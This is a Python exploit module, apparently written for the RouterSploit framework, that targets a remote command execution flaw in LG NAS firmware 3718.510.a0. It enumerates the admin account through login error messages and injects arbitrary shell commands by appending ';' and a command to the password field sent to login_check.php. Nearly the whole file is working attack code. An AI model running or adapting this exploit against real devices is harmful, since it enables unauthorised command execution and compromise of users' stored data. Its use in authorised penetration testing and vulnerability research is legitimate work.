# rsf exploit module
# description: Exploits LG-NAS Storage Remote Command Execution vulnerability
# in the web-based certificate generator feature.

from collections import OrderedDict
import requests

class Exploit:
    __info__ = {
        "name": "LG_NAS_3718.510.a0_RCE",
        "description": "Module exploits LG-NAS Storage Remote Command Execution vulnerability "
                       "in the web-based certificate generator feature.",
        "authors": (
            "@0x616163",  # vulnerability discovery
            "GH0st3rs",  # routersploit module
        ),
        "references": (
            "https://www.vpnmentor.com/blog/critical-vulnerability-found-majority-lg-nas-devices/",
            "https://www.exploit-db.com/exploits/45109",
        ),
        "devices": (
            "3718.510.a0",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def check(self):
        # Exploiting this vulnerability requires a valid user account
        # on the target NAS otherwise the vulnerable code is not executed
        parameters = OrderedDict([('op_mode', 'login'), ('id', 'admin'), ('password', 'pass'), ('mobile', 'false')])
        response = requests.post(f"http://{self.target}:{self.port}/en/php/login_check.php", data=parameters)
        if response:
            if response.text == "NG:WRONG PASSWORD\n":
                print(f"Valid user found: admin for {self.target}:{self.port}")
                return True
            if response and response.text == "NG:NO USER\n":
                print(f"User not found: admin for {self.target}:{self.port}")
        return False

    def execute(self, cmd):
        parameters = OrderedDict([('op_mode', 'login'), ('id', 'admin'), ('password', 'pass;' + cmd), ('mobile', 'false')])
        response = requests.post(f"http://{self.target}:{self.port}/en/php/login_check.php", data=parameters, timeout=0.5)
        if response and response.status_code == 200:
            return response.text
        return ''

    def run(self):
        if self.check():
            print(f"Target seams {self.target}:{self.port} is vulnerable")
            # Implement shell functionality here (shell is external)
        else:
            print(f"Exploit failed - target {self.target}:{self.port} seems to be not vulnerable")

